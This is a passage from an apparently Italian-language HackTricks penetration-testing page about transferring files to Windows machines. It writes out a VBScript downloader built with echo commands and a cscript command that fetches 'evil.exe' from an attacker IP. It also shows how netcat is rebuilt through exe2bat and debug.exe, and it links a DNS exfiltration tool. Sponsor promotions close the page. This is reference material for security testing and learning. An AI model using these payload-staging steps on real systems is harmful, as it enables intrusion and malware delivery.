echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Il programma `debug.exe` non solo consente l'ispezione dei file binari, ma ha anche la **capacità di ricostruirli da un esadecimale**. Ciò significa che fornendo un esadecimale di un file binario, `debug.exe` può generare il file binario corrispondente. Tuttavia, è importante notare che debug.exe ha una **limitazione nell'assemblaggio di file fino a 64 kb di dimensione**.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Quindi copia-incolla il testo nella shell di Windows e verrà creato un file chiamato nc.exe.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità che contano di più in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
